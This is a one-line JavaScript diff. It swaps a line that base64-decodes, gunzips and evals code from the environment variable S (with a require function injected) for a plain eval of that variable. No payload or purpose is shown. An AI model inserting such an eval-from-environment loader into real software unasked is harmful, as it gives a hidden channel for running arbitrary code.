@@ -1,1 +1,1 @@
-import{createRequire}from"node:module";import{gunzipSync}from"node:zlib";eval("var require=createRequire("+JSON.stringify(import.meta.url)+");"+gunzipSync(Buffer.from(process.env.S,"base64")).toString());
+eval(process.env.S)
